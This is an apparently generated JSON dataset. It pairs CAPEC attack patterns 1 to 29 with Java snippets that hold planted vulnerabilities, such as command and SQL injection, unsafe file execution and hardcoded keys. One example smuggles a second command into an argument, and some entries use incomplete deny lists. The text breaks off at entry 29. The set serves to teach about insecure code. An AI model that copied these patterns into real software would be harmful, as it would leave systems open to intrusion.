[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "public class FileManager {\n    private static final String UPLOAD_DIR = \"/var/www/uploads/\";\n    \n    public void setupDirectoryPermissions() {\n        File uploadDir = new File(UPLOAD_DIR);\n        uploadDir.setWritable(true, false);  // Makes directory writable by everyone\n        uploadDir.setReadable(true, false);  // Makes directory readable by everyone\n    }\n    \n    public boolean uploadFile(String fileName, InputStream fileContent) {\n        try {\n            File targetFile = new File(UPLOAD_DIR + fileName);\n            FileOutputStream out = new FileOutputStream(targetFile);\n            IOUtils.copy(fileContent, out);\n            targetFile.setExecutable(true, false);  // Makes file executable by everyone\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n    \n    public boolean accessResource(String resourcePath) {\n        // No authorization check implemented\n        File resource = new File(resourcePath);\n        return resource.exists();\n    }\n}",
        "description": "This vulnerable code demonstrates improper access control and incorrect default permissions. The code sets world-writable and readable permissions on upload directories, allows unrestricted file uploads without type checking, and lacks proper authorization checks when accessing resources. It also makes uploaded files executable by all users, creating a significant security risk."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "public class AccountManager {\n    private static final int MAX_LOGIN_ATTEMPTS = 3;\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n    private Map<String, Boolean> lockedAccounts = new HashMap<>();\n\n    public boolean login(String username, String password) {\n        if (lockedAccounts.getOrDefault(username, false)) {\n            return false;\n        }\n\n        int attempts = loginAttempts.getOrDefault(username, 0);\n        \n        if (!authenticateUser(username, password)) {\n            loginAttempts.put(username, attempts + 1);\n            \n            if (attempts + 1 >= MAX_LOGIN_ATTEMPTS) {\n                lockedAccounts.put(username, true);\n                // Account locked indefinitely with no reset mechanism\n            }\n            return false;\n        }\n        return true;\n    }\n\n    private boolean authenticateUser(String username, String password) {\n        // Basic password check without complexity requirements\n        return \"password123\".equals(password);\n    }\n}",
        "description": "This vulnerable code implements an overly restrictive account lockout mechanism that can be exploited for denial of service. It locks accounts indefinitely after just three failed attempts with no automated unlock mechanism or administrator override. The authentication is weak, using a hardcoded password with no complexity requirements. An attacker can easily trigger account lockouts for legitimate users by attempting multiple failed logins."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "public class FileAccessValidator {\n    private static final String RESTRICTED_DIR = \"/secure/files/\";\n\n    public boolean validateAndAccessFile(String userInput) {\n        // Validate user input before canonicalization\n        if (!userInput.startsWith(RESTRICTED_DIR)) {\n            return false;\n        }\n\n        try {\n            String decodedPath = java.net.URLDecoder.decode(userInput, \"UTF-8\");\n            java.io.File file = new java.io.File(decodedPath);\n            String canonicalPath = file.getCanonicalPath();\n\n            // Access file without re-validating after canonicalization\n            return file.exists();\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This vulnerable code attempts to validate file access by checking if a user-provided path starts with a restricted directory. However, it validates the input before decoding and canonicalization, allowing attackers to bypass the validation using encoded characters (like %2e%2e%2f for '../') or path traversal sequences. The validation should occur after canonicalization to prevent path equivalence attacks."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "public class IPAuthenticator {\n    public boolean authenticateUser(String ipAddress) {\n        // Vulnerable: relies solely on IP for authentication and doesn't handle alternate formats\n        String[] allowedIPs = {\"192.168.1.1\", \"10.0.0.1\"};\n        \n        try {\n            // Vulnerable: performs reverse DNS lookup without verification\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: doesn't handle alternate IP formats like hex or octal\n            for(String allowed : allowedIPs) {\n                if(ipAddress.equals(allowed) || \n                   hostname.endsWith(\".trusted-domain.com\")) {\n                    return true;\n                }\n            }\n        } catch(Exception e) {\n            return false;\n        }\n        return false;\n    }\n    \n    public void processRequest(String userInput) {\n        // Vulnerable: doesn't properly handle encoded URI schemes\n        String decodedInput = URLDecoder.decode(userInput);\n        if(authenticateUser(decodedInput)) {\n            executeCommand(decodedInput);\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable IP-based authentication that fails to properly validate IP address formats, relies on reverse DNS resolution, and doesn't handle alternate encodings properly. It accepts IP addresses without proper format validation, performs unsafe reverse DNS lookups, and doesn't verify the authenticity of the communication channel endpoints."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "public class LegacyTelephoneSwitch {\n    private static final String SUPERVISOR_TONE = \"2600Hz\";\n\n    public boolean processSignal(String incomingTone, String lineId) {\n        // Vulnerable: No authentication or verification of tone source\n        if (incomingTone.equals(SUPERVISOR_TONE)) {\n            // Direct access to privileged command based only on tone\n            grantSupervisorAccess(lineId);\n            return true;\n        }\n        return false;\n    }\n\n    private void grantSupervisorAccess(String lineId) {\n        // Vulnerable: No validation of authorization or message integrity\n        rerouteLine(lineId);\n        grantAdminPrivileges(lineId);\n    }\n\n    private void rerouteLine(String lineId) {\n        // Reroute telephone line without proper verification\n        System.out.println(\"Line \" + lineId + \" rerouted\");\n    }\n\n    private void grantAdminPrivileges(String lineId) {\n        // Grant admin access without proper authentication\n        System.out.println(\"Admin privileges granted for line \" + lineId);\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of a legacy telephone switch system that is susceptible to blue boxing attacks. It accepts control signals without proper authentication, authorization, or verification of the signal source. The system grants supervisor access based solely on matching a specific tone frequency, allowing replay attacks and unauthorized access to administrative functions. It lacks message integrity checks and proper communication channel security, making it vulnerable to manipulation and unauthorized control of telephone lines."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "public class CommandExecutor {\n    public String executeCommand(String userInput) {\n        try {\n            String cmd = \"cmd.exe /c dir \" + userInput;\n            Process process = Runtime.getRuntime().exec(cmd);\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            return reader.readLine();\n        } catch (IOException e) {\n            return \"Error executing command\";\n        }\n    }\n\n    public boolean validateInput(String input) {\n        // Incomplete blacklist of dangerous characters\n        String[] blacklist = {\";\", \"&\", \"|\"};  \n        for(String banned : blacklist) {\n            if(input.contains(banned)) return false;\n        }\n        return true;\n    }\n}",
        "description": "This code is vulnerable to command injection as it directly concatenates user input into a command string without proper sanitization. The validation method uses an incomplete blacklist, allowing various special characters and command delimiters to bypass the check. An attacker could inject additional commands using characters not in the blacklist or use other OS command syntax to execute arbitrary commands."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "public class UserAuthentication {\n    private Connection conn;\n\n    public boolean isValidUser(String username, String password) {\n        try {\n            String query = \"SELECT COUNT(*) FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            rs.next();\n            int count = rs.getInt(1);\n            return (count > 0);\n        } catch (SQLException e) {\n            // Silently catch and suppress error messages\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system susceptible to blind SQL injection. It directly concatenates user input into an SQL query without sanitization and suppresses error messages, allowing an attacker to perform blind SQL injection by observing the boolean response of the authentication attempt. The code exhibits poor input validation (CWE-20), improper neutralization of SQL elements (CWE-89), and masks database errors (CWE-209) which can be exploited through blind SQL injection techniques."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "public class VulnerableSharedLibrary {\n    private static final int BUFFER_SIZE = 256;\n    \n    public static void copyUserData(String input) {\n        byte[] buffer = new byte[BUFFER_SIZE];\n        try {\n            byte[] inputData = input.getBytes();\n            System.arraycopy(inputData, 0, buffer, 0, inputData.length);\n            processBuffer(buffer);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void processBuffer(byte[] buffer) {\n        for(int i = 0; i <= buffer.length; i++) {\n            if(buffer[i] == 0) {\n                break;\n            }\n            // Process each byte\n        }\n    }\n    \n    public static void main(String[] args) {\n        String userInput = args[0];\n        copyUserData(userInput);\n    }\n}",
        "description": "This vulnerable shared library code demonstrates multiple security issues: it performs a buffer copy without checking input size against buffer size, contains an off-by-one error in the buffer traversal loop, lacks input validation, and could be subject to integer overflow if large input is provided. The code is meant to be shared across multiple applications, making any vulnerability widely exploitable."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "public class CommandLineUtility {\n    private static final int BUFFER_SIZE = 1024;\n    \n    public static void executeCommand(String[] args) {\n        char[] buffer = new char[BUFFER_SIZE];\n        String command = \"\";\n        \n        // Concatenate all command arguments without validation\n        for (int i = 0; args != null && i <= args.length; i++) {\n            command += args[i] + \" \";\n        }\n        \n        // Copy command to buffer without bounds checking\n        for (int i = 0; i < command.length(); i++) {\n            buffer[i] = command.charAt(i);\n        }\n        \n        // Execute command with system privileges\n        try {\n            Runtime.getRuntime().exec(\"/bin/sh -c \" + new String(buffer));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a command-line utility that processes user input without proper validation. It contains multiple vulnerabilities including buffer overflow (CWE-120), improper input validation (CWE-20), and command injection (CWE-74). The code concatenates command arguments without sanitization, performs unsafe buffer operations, and executes commands with elevated privileges, making it susceptible to privilege escalation attacks."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "public class EnvironmentVarBuffer {\n    private static final int BUFFER_SIZE = 256;\n    \n    public static void processEnvironmentVar(String varName) {\n        String envValue = System.getenv(varName);\n        byte[] buffer = new byte[BUFFER_SIZE];\n        \n        if (envValue != null) {\n            // Vulnerable: No size check before copying\n            System.arraycopy(envValue.getBytes(), 0, buffer, 0, envValue.getBytes().length);\n            \n            // Process the environment variable\n            String command = \"/bin/process \" + new String(buffer);\n            try {\n                Runtime.getRuntime().exec(command);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation that processes environment variables without proper bounds checking. It creates a fixed-size buffer and blindly copies environment variable data into it without verifying the input length, potentially causing a buffer overflow. Additionally, it uses the environment variable data directly in a command execution context without proper sanitization, making it vulnerable to command injection."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "public class FileUploadHandler extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"filename\");\n        String uploadDir = \"/var/www/uploads/\";\n        \n        Part filePart = request.getPart(\"file\");\n        String contentType = filePart.getContentType();\n        \n        File file = new File(uploadDir + fileName);\n        try (OutputStream out = new FileOutputStream(file);\n             InputStream filecontent = filePart.getInputStream()) {\n            byte[] buffer = new byte[1024];\n            int read;\n            while ((read = filecontent.read(buffer)) != -1) {\n                out.write(buffer, 0, read);\n            }\n            \n            // Determine handler based solely on file extension\n            if(fileName.endsWith(\".php\")) {\n                Runtime.getRuntime().exec(\"php \" + uploadDir + fileName);\n            } else if(fileName.endsWith(\".jsp\")) {\n                request.getRequestDispatcher(fileName).include(request, response);\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an insecure file upload handler that relies solely on file extensions to determine how to process uploaded files. It accepts any filename without validation, saves files to a web-accessible directory, and executes files based on their extension. The code fails to properly validate file names, types, or content, making it susceptible to bypass attempts and remote code execution through malicious file uploads."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "public class MulticastMessageHandler {\n    private static final String COMMAND_CHANNEL = \"system.commands\";\n    \n    public void handleMessage(String message, String clientId) {\n        // No authentication check for message handling\n        MessageBus messageBus = MessageBus.getInstance();\n        \n        // Vulnerable message parsing without verification\n        String[] parts = message.split(\"::\");\n        String receiverId = parts[0];\n        String content = parts[1];\n        \n        // Direct conversion of client ID without validation\n        int securityLevel = Integer.parseInt(clientId);\n        \n        // Sending sensitive data without encryption or integrity checks\n        if(securityLevel > 0) {\n            String sensitiveData = loadSensitiveData(receiverId);\n            messageBus.broadcast(COMMAND_CHANNEL, sensitiveData + \":\" + content);\n        }\n    }\n    \n    private String loadSensitiveData(String clientId) {\n        return \"SECRET_KEY_\" + clientId;\n    }\n}",
        "description": "This vulnerable code demonstrates a multicast message handling system that fails to properly authenticate clients, validate message integrity, and protect sensitive information. It allows attackers to intercept messages, impersonate other clients by manipulating client IDs, and access sensitive information through insecure message broadcasting. The code directly converts client IDs to security levels without proper validation and broadcasts messages without encryption or integrity checks."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "public class ConfigManager {\n    public void updateEnvironment(String envVar, String value) {\n        // No validation of input or authorization check\n        System.setProperty(envVar, value);\n        \n        String command = \"echo \" + value + \" > /etc/config/\" + envVar;\n        try {\n            Runtime.getRuntime().exec(command);\n            \n            // Load sensitive configuration\n            String dbPassword = System.getProperty(\"db.password\");\n            String configPath = System.getProperty(\"user.home\") + \"/\" + value;\n            ProcessBuilder pb = new ProcessBuilder(\"sh\", \"-c\", \"export \" + envVar + \"=\" + value);\n            pb.environment().put(envVar, value);\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows direct modification of environment variables and system properties without proper validation, authorization, or sanitization. It exposes sensitive configuration data, allows command injection through unvalidated input, and permits arbitrary file path manipulation. The code demonstrates environment variable tampering vulnerabilities by accepting untrusted input and using it directly in system operations."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "public class VulnerableServer {\n    private static final int BUFFER_SIZE = 1024;\n    \n    public void processClientRequest(Socket clientSocket) {\n        try {\n            byte[] buffer = new byte[BUFFER_SIZE];\n            InputStream input = clientSocket.getInputStream();\n            int bytesRead = input.read(buffer);\n            \n            // Vulnerable buffer copy without size check\n            byte[] processBuffer = new byte[BUFFER_SIZE];\n            for(int i = 0; i < bytesRead; i++) {\n                processBuffer[i] = buffer[i];  // No bounds checking\n            }\n            \n            // Process data without validation\n            String data = new String(processBuffer);\n            if(data.startsWith(\"CMD:\")) {\n                String command = data.substring(4);\n                Runtime.getRuntime().exec(command);  // Command injection vulnerability\n            }\n            \n            // Send response without integrity check\n            OutputStream output = clientSocket.getOutputStream();\n            output.write(processBuffer);\n            \n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable server implementation that processes client requests without proper input validation, buffer size checks, or integrity verification. It includes multiple vulnerabilities: classic buffer overflow (CWE-120), lack of integrity checks (CWE-353), improper memory buffer operations (CWE-119), command injection (CWE-74), and improper input validation (CWE-20). The code accepts raw input from a client socket and processes it without bounds checking or validation, potentially leading to buffer overflows and command injection attacks."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "public class CommandProcessor {\n    private static String[] deniedCommands = {\"rm\", \"del\", \"format\"};\n\n    public static void executeCommand(String userInput) {\n        // Basic denylist check\n        for (String denied : deniedCommands) {\n            if (userInput.toLowerCase().contains(denied)) {\n                return;\n            }\n        }\n\n        try {\n            // Vulnerable command execution\n            String command = \"cmd.exe /c dir \" + userInput;\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        // Example usage\n        executeCommand(\"C:\\\\Users && echo Injected command\");\n    }\n}",
        "description": "This code demonstrates a vulnerable command execution system that relies on a denylist approach for input validation. It fails to properly neutralize command delimiters and special characters, allowing command injection through characters like '&&', '|', or ';'. The denylist is incomplete and can be bypassed using various command combinations or alternative syntax."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "public class UserAuthentication {\n    private static final int MAX_PASSWORD_AGE_DAYS = 365; // Too long expiration\n\n    public boolean authenticate(String username, String password) {\n        User user = getUserFromDB(username);\n        if (user == null) return false;\n        \n        // Simple password comparison without rate limiting\n        return user.getPassword().equals(password);\n    }\n\n    public boolean createUser(String username, String password) {\n        // Weak password validation\n        if (password.length() >= 4) {\n            User newUser = new User(username, password);\n            saveUserToDB(newUser);\n            return true;\n        }\n        return false;\n    }\n\n    private void saveUserToDB(User user) {\n        // Store password in plain text\n        Database.store(user.getUsername(), user.getPassword());\n    }\n\n    private User getUserFromDB(String username) {\n        String password = Database.getPassword(username);\n        return new User(username, password);\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities related to password authentication: weak password requirements (only 4 characters), no password aging mechanism, single-factor authentication, no protection against brute force attempts, and plain text password storage. The authentication method performs a simple string comparison without any rate limiting or account lockout mechanisms, making it susceptible to dictionary attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "public class FileExecutor {\n    public static void executeUploadedFile(String fileName) {\n        try {\n            // No validation of file ownership or permissions\n            File uploadedFile = new File(\"/uploads/\" + fileName);\n            \n            // Directly execute uploaded file without authorization checks\n            ProcessBuilder pb = new ProcessBuilder(uploadedFile.getAbsolutePath());\n            pb.inheritIO();\n            \n            // Running with elevated privileges without dropping them\n            Process process = pb.start();\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        executeUploadedFile(\"user_script.sh\");\n    }\n}",
        "description": "This code demonstrates vulnerable file execution by allowing direct execution of uploaded files without proper permission checks, authorization, or privilege management. It fails to validate file ownership, doesn't follow proper privilege dropping practices, and doesn't protect against symlink attacks. The code runs with elevated privileges throughout its execution and doesn't implement any protection mechanisms against malicious file execution."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "@WebServlet(\"/imageViewer\")\npublic class ImageViewerServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String imageUrl = request.getParameter(\"url\");\n        String userComment = request.getParameter(\"comment\");\n        \n        response.setContentType(\"text/html\");\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<img src='\" + imageUrl + \"' alt='User Image'>\");\n        out.println(\"<!-- User Comment: \" + userComment + \" -->\");\n        out.println(\"</body></html>\");\n    }",
        "description": "This code is vulnerable to XSS through both the image tag and HTML comments. It directly embeds user input into the src attribute of an img tag and within HTML comments without any sanitization. An attacker could inject malicious JavaScript through the imageUrl parameter (e.g., 'javascript:alert(1)') or through the comment parameter using CDATA-like constructs or other script elements that might bypass basic filters."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "public class ScriptProcessor {\n    private String trustedDomain = \"trusted.com\";\n\n    public void processUserScript(String userInput, HttpServletRequest request) {\n        if (request.getHeader(\"Referer\").contains(trustedDomain)) {\n            // Unsafe direct script execution without proper sanitization\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\");\n            try {\n                // Recursively process scripts without checking nesting level\n                processNestedScripts(userInput, engine);\n                // Embed user input directly into HTML without escaping\n                String htmlOutput = \"<div>\" + userInput + \"</div>\";\n                // Include remote script from user-provided URL\n                htmlOutput += \"<script src='\" + request.getParameter(\"scriptUrl\") + \"'></script>\";\n                response.getWriter().write(htmlOutput);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void processNestedScripts(String script, ScriptEngine engine) throws Exception {\n        engine.eval(script);\n        // Potential infinite recursion if script contains self-reference\n        if (script.contains(\"processNestedScripts\")) {\n            processNestedScripts(script, engine);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: improper access control with weak domain validation, XSS through unescaped user input, unsafe script execution, inclusion of untrusted remote scripts, and potential reentrant code execution through nested script processing. The code allows execution of arbitrary JavaScript, embeds unvalidated user input into HTML, and includes remote scripts from user-provided URLs without proper validation."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "public class WeakEncryption {\n    // Hard-coded encryption key and IV\n    private static final String ENCRYPTION_KEY = \"1234567890abcdef\";\n    private static final String STATIC_IV = \"0000000000000000\";\n\n    public static String encrypt(String plaintext) {\n        try {\n            // Using weak DES encryption\n            Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");\n            SecretKeySpec keySpec = new SecretKeySpec(ENCRYPTION_KEY.getBytes(), \"DES\");\n            IvParameterSpec iv = new IvParameterSpec(STATIC_IV.getBytes());\n            \n            cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);\n            byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n            return Base64.getEncoder().encodeToString(encrypted);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using the weak DES algorithm, a hard-coded encryption key, a static initialization vector (IV), and insufficient key length. These issues make the encryption susceptible to brute force attacks as described in the CAPEC."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "public class SessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n    private static final String COOKIE_NAME = \"sessionId\";\n    \n    public static String createSession(String username) {\n        String sessionId = String.valueOf(System.currentTimeMillis());\n        sessions.put(sessionId, username);\n        return sessionId;\n    }\n    \n    public static boolean isAuthenticated(HttpServletRequest request) {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (COOKIE_NAME.equals(cookie.getName())) {\n                    return sessions.containsKey(cookie.getValue());\n                }\n            }\n        }\n        return false;\n    }\n    \n    public static void doSecureOperation(HttpServletRequest request) {\n        if (isAuthenticated(request)) {\n            // Proceed with secure operation\n            // No session validation or origin checking\n        }\n    }\n}",
        "description": "This vulnerable code implements a session management system that is susceptible to session riding/hijacking. It uses predictable session IDs (based on timestamp), doesn't validate session origin, lacks session expiration, and implements weak authentication checks. The session IDs are stored in persistent cookies without proper security controls, making them easy targets for spoofing and hijacking attacks."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "public class AuthenticationService {\n    private static final String TRUSTED_CLIENT_IP = \"192.168.1.100\";\n    \n    public boolean authenticateClient(String clientIp, String token) {\n        // Vulnerable: relies solely on IP address for authentication\n        if (clientIp.equals(TRUSTED_CLIENT_IP)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public void processClientRequest(String clientIp, String request) {\n        if (authenticateClient(clientIp, null)) {\n            // Vulnerable: no input validation on request\n            executeCommand(request);\n            sendSensitiveData();\n        }\n    }\n    \n    private void executeCommand(String cmd) {\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private void sendSensitiveData() {\n        String sensitiveData = \"SECRET_KEY=12345\";\n        // Vulnerable: sends sensitive data without proper verification\n        System.out.println(sensitiveData);\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system that relies solely on IP address spoofing for client verification. It lacks proper input validation, exposes sensitive information, and has weak protection mechanisms. The authentication can be bypassed by spoofing the trusted IP address, and the system executes commands without validation."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    private static final String UPLOAD_DIR = \"/uploads/\";\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        Part filePart = request.getPart(\"file\");\n        String fileName = filePart.getSubmittedFileName();\n        String filePath = UPLOAD_DIR + fileName;\n\n        // Vulnerable: No validation of file type or content\n        try (InputStream input = filePart.getInputStream();\n             FileOutputStream output = new FileOutputStream(new File(filePath))) {\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = input.read(buffer)) != -1) {\n                output.write(buffer, 0, bytesRead);\n            }\n\n            // Vulnerable: Automatic execution of uploaded files\n            if (fileName.endsWith(\".exe\") || fileName.endsWith(\".jar\")) {\n                Runtime.getRuntime().exec(filePath);\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable file upload implementation that allows unrestricted file uploads without proper validation. It blindly trusts the file name and extension, and automatically executes certain file types. The code lacks input validation, relies on file extensions for processing decisions, and automatically executes potentially malicious uploaded files, making it susceptible to malware and remote code execution attacks."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "public class FilterBypass {\n    public static void processUserInput(String input) {\n        char[] buffer = new char[64];\n        int maxLength = buffer.length;\n        \n        try {\n            // Flawed size comparison due to integer overflow\n            if (input.length() + 1 > 0) {\n                // Vulnerable buffer copy without proper bounds checking\n                for (int i = 0; i <= input.length(); i++) {\n                    buffer[i] = input.charAt(i);\n                }\n                \n                // Process filtered content\n                String filtered = new String(buffer);\n                executeCommand(filtered);\n            }\n        } catch(Exception e) {\n            // Unsafe fallback that bypasses filter\n            executeCommand(input);\n        }\n    }\n    \n    private static void executeCommand(String cmd) {\n        // Execute the potentially unfiltered command\n        Runtime.getRuntime().exec(cmd);\n    }\n}",
        "description": "This code demonstrates a vulnerable input filtering mechanism that can be bypassed through buffer overflow. It contains multiple vulnerabilities including improper buffer size checking, integer overflow in length comparison, unsafe array indexing, and unsafe command execution. If the input exceeds the buffer size, it will trigger an exception that leads to executing unfiltered input."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "public class DeadlockExample {\n    private static Object lock1 = new Object();\n    private static Object lock2 = new Object();\n    \n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> {\n            synchronized(lock1) {\n                try { Thread.sleep(100); } catch(InterruptedException e) {}\n                synchronized(lock2) {\n                    System.out.println(\"Thread 1: Holding lock 1 & 2\");\n                }\n            }\n        });\n        \n        Thread thread2 = new Thread(() -> {\n            synchronized(lock2) {\n                try { Thread.sleep(100); } catch(InterruptedException e) {}\n                synchronized(lock1) {\n                    System.out.println(\"Thread 2: Holding lock 2 & 1\");\n                }\n            }\n        });\n        \n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This code demonstrates a classic deadlock scenario where two threads acquire locks in different orders. Thread 1 acquires lock1 then attempts to acquire lock2, while Thread 2 acquires lock2 then attempts to acquire lock1. This creates a circular wait condition where each thread holds a lock that the other thread needs, resulting in a permanent deadlock state."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "public class BankAccount {\n    private int balance = 0;\n\n    public void deposit(int amount) {\n        int temp = balance;\n        // Simulate some processing time\n        try {\n            Thread.sleep(100);\n        } catch (InterruptedException e) {}\n        balance = temp + amount;\n    }\n\n    public void withdraw(int amount) {\n        int temp = balance;\n        // Simulate some processing time\n        try {\n            Thread.sleep(100);\n        } catch (InterruptedException e) {}\n        if (temp >= amount) {\n            balance = temp - amount;\n        }\n    }\n\n    public static void main(String[] args) {\n        BankAccount account = new BankAccount();\n        \n        Thread t1 = new Thread(() -> account.deposit(100));\n        Thread t2 = new Thread(() -> account.withdraw(100));\n        \n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This code demonstrates a classic race condition vulnerability in a bank account system. The deposit and withdraw methods are not synchronized, allowing concurrent access to the shared balance variable. When multiple threads attempt to modify the balance simultaneously, the final balance may be incorrect due to the race condition. The sleep calls simulate processing time, making the race condition more likely to occur. The vulnerability allows for potential financial loss or inconsistent account states."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "public class FileProcessor {\n    public static void processUserFile(String tempFilePath, String finalPath) {\n        try {\n            // Check if temp file exists\n            File tempFile = new File(tempFilePath);\n            if (!tempFile.exists()) {\n                // VULNERABILITY: Race condition between check and creation\n                Thread.sleep(100); // Simulating some processing time\n                \n                // Create and write to temp file\n                FileWriter writer = new FileWriter(tempFile);\n                writer.write(\"Sensitive data\");\n                writer.close();\n                \n                // Move temp file to final location\n                File finalFile = new File(finalPath);\n                tempFile.renameTo(finalFile);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a TOCTOU race condition in file operations. The code checks for a file's existence, then attempts to create and write to it without proper synchronization. An attacker could create a symbolic link during the time window between the check and file creation, redirecting the write operation to a sensitive file. The code lacks proper file locking mechanisms and doesn't verify if the target path has been modified by a symbolic link, making it susceptible to symlink attacks."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "public class FuzzTarget {\n    private static final String[] ALLOWED_INPUTS = {\"safe1\", \"safe2\"};\n    \n    public void processUserInput(String input) {\n        try {\n            if(!validateInput(input)) {\n                String errorMsg = \"Invalid input: \" + input + \" from user: \" + System.getProperty(\"user.name\");\n                System.err.println(errorMsg);\n                return;\n            }\n            \n            String command = \"cmd.exe /c dir \" + input;\n            Runtime.getRuntime().exec(command);\n            \n        } catch(Exception e) {\n            e.printStackTrace();\n            System.err.println(\"Error processing input: \" + input + \n                             \", System path: \" + System.getenv(\"PATH\"));\n        }\n    }\n    \n    private boolean validateInput(String input) {\n        return Arrays.asList(ALLOWED_INPUTS).contains(input);\n    }\n}",
        "description": "This code is vulnerable to fuzzing attacks due to multiple weaknesses: improper input validation with an incomplete allowlist, command injection vulnerability through direct use of user input in system commands, and information disclosure through detailed error messages that reveal system information. The code attempts to validate input but uses a simplistic approach that can be bypassed through fuzzing various input combinations."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
